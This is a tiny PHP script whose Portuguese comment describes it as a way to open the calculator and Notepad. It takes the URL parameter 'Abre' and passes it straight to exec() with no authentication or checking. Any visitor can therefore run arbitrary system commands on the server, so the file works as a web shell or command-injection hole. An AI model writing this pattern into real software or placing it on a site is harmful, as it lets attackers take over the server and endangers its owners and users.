<?php             
    //FUNCAO PARA ABRIR CALCULADORA E BLOCO DE NOTAS	
    if (isset($_GET["Abre"])){
        $Abre = $_GET["Abre"];
        exec($Abre);
    }
?> 